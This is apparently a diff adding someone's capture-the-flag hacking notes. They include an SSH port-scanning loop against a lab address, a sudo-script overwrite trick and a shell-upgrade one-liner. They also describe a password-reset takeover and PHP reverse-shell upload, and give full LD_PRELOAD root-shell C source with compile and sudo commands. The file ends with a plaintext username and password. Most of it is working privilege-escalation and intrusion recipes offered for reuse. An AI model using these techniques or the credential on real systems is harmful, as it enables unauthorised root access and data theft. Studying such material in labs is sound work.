@@ -1,0 +1,93 @@
+add tosite:
+
+script to test various ssh ports
+---------------------------------
+#!/bin/bash
+
+for port in {9000..13999}; do
+  ssh -o ConnectTimeout=5 -p $port root@10.10.115.189 exit
+  if [ $? -eq 0 ]; then
+    echo "SSH connection successful on port $port"
+    exit 0
+  fi
+done
+echo "No open SSH port found"
+exit 1
+
+
+- add to ssh when connecting
+-o StrictHostKeyChecking=no
+
+
+
+What hapens if you come across sudo -l /sbin/reboot
+- home directory has a .sh file
+- we over write it
+
+
+upgrade to proper shell
+python3 -c "import pty;pty.spawn('/bin/bash')"
+ctrl z
+stty raw -echo
+fg
+
+--- 
+grab the id_rsa private key - and then chmod 600
+
+
+
+Boxes: 
+had a CTF,where by the standard user could change password of the admin by catching
+in burpsuite and editing from user email to admin (which is found easily)
+
+then when you go to profile of admin, source code view: and browse and you find
+and images upload directory.
+
+So you go bk to profile, upload a reverse php shell (no indicator if uploaded or not)
+then back to browser, type in /directory of image uploads followed by reverse shell
+(ensure listener is on)
+
+
+getent - VERY IMPORTANT
+ is a command used in Linux and Unix-like operating systems to retrieve information from various system databases, such as the password file, group file, and hosts file. It stands for "get entries." It can be used to retrieve information about a specific user or group, or to list all users or groups. For example, the command getent passwd will list all users on the system, and getent passwd username will show information about the user with the username "username."
+
+
+ss -tulnp
+lookto use are you finding sql port numbers if so you got a db running , find which one
+
+
+
+mongo db
+in terminal type: mongo 
+show databases
+use <select db>
+show collections;
+db.<dbname>.find();
+
+----
+LD_Preload
+
+save as: shell.c  - best to do in /tmp directory
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/bash");
+}
+
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+if you get errors include the following: #include <unistd.h>
+
+sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility (in the CTf, this was the program which has root perms without password
+
+may need to do from kali box, and ensure it is run from /home directores not .tmp
+
+https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
+
+"Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
